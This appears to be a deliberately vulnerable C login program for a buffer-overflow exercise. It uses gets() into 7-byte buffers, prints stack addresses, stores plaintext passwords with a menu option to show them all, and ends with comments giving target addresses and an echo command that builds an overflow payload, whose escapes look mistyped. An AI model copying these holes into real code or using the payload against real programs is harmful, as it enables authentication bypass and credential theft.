#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define MAX_LEN 7
#define FILENAME "credentials.txt"

void showPasswords()
{
    FILE *file = fopen("credentials.txt", "r");
    if (file == NULL)
    {
        perror("Failed to open file");
        return;
    }
    char line[MAX_LEN];
    while (fgets(line, sizeof(line), file))
    {
        printf("%s", line);
    }
    fclose(file);
}

void registerUser()
{
    char username[MAX_LEN];
    char password[MAX_LEN];
    
    printf("Enter username: ");
    fgets(username, sizeof(username), stdin);
    username[strcspn(username, "\n")] = '\0'; // Remove newline character
    printf("Enter password: ");
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = '\0'; // Remove newline character

    FILE *file = fopen("credentials.txt", "a");
    if (file == NULL)
    {
        perror("Failed to open file");
        return;
    }
    fprintf(file, "%s %s\n", username, password);
    fclose(file);
    printf("User registered successfully!\n");
}
    
bool login()
{
    char username[MAX_LEN] ={1,2,3,4,5,6,7};
    bool authenticated = false;
    char password[MAX_LEN]={1,2,3,4,5,6,7};
    char fileUsername[MAX_LEN];
    char filePassword[MAX_LEN];
    FILE *file = fopen("credentials.txt", "r");
    printf("Address of username: %p\n", (void *)username);
    printf("Address of password: %p\n", (void *)password);
    printf("Address of authenticated: %p\n", (void *)&authenticated);

    if (file == NULL)
    {
        perror("Failed to open file");
        return false;
    }
    printf("Enter username: ");
    gets(username);
    printf("Enter password: ");
    gets(password);

    while (fscanf(file, "%s %s", fileUsername, filePassword) != EOF)
    {
        if (strcmp(username, fileUsername) == 0 && strcmp(password, filePassword) == 0)
        {
            authenticated = true;
            break;
        }
    }
    fclose(file);
    return authenticated;
}
int main()
{
    int choice;
    bool authenticated = false;

    while (1)
    {
        printf("1. Register\n");
        printf("2. Login\n");
        printf("3. Show all passwords\n");
        printf("4. Exit\n");
        printf("Enter your choice: ");
        scanf("%d", &choice);
        getchar(); // Consume newline character

        switch (choice)
        {
        case 1:
            registerUser();
            break;
        case 2:
            authenticated = login();
            if (authenticated)
            {
                printf("Login successful!\n");
            }
            else
            {
                printf("Login failed!\n");
            }
            break;
        case 3:
            showPasswords();
            break;
        case 4:
            exit(0);
        default:
            printf("Invalid choice\n");
        }
    }

    return 0;
}


// source 0x100003d38
// target 0x100003d54
// fp 0x000000016fdfeeb0
// echo -n -e "/x38/x3d/x00/x01/x00/x00/x00/x00/x54/x3d/x00/x01/x00/x00/x00/x00" > input.bin